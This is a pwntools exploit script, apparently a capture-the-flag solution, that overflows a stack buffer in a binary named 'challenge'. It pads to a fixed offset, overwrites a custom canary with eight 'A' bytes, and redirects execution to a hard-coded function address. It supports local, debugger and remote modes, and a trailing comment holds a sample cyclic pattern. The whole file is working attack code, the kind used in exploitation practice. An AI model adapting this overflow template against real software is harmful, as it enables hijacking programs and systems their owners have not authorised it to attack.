#!/bin/python3
from pwn import *
import sys

binary = "./challenge"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
#libc = elf.libc
#rop = ROP(elf)

script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    # custom canary via file
    canary = "A"*8
    #offset to canary
    offset = 32
    #offset to eip 
    off = 56
    # offset to eip from (after) canary
    p = 16
    func = 0x8049259
    payload = flat(
        cyclic(offset),
        canary,
        cyclic(p),
        func
    )

    io = start()
    io.recvuntil("name have?\n")
    io.sendline(b'100')
    io.recvuntil('the name? \n')
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()

'''

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
'''